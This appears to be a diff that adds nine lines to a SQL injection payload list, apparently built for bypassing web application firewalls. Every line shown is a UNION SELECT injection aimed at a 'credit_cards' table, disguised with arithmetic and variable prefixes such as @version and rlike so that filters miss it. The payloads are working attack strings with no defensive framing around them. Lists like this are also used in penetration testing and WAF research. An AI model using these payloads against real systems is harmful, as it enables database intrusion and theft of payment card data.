@@ -113,3 +113,12 @@ TRUE DIV(SELECT ((ORD(LEFT
 1001-false-NULL union select 1,2,3,4 from credit_cards
 1001 rlike(1-NULL)union select 1,2,3,4 from credit_cards
 1001 rlike(1-(NULL))union select 1,2,3,4 from credit_cards
+(1)-'1' union select 1,2,3,4 from credit_cards
+(1)-@version union select 1,2,3,4 from credit_cards
+(@versoin)-@version union select 1,2,3,4 from credit_cards
+(@versoin)-1 union select 1,2,3,4 from credit_cards
+(@versoin)-'1' union select 1,2,3,4 from credit_cards
+@versoin-@version union select 1,2,3,4 from credit_cards
+@versoin-1 union select 1,2,3,4 from credit_cards
+@versoin-'1' union select 1,2,3,4 from credit_cards
+('1')-'1' union select 1,2,3,4 from credit_cards
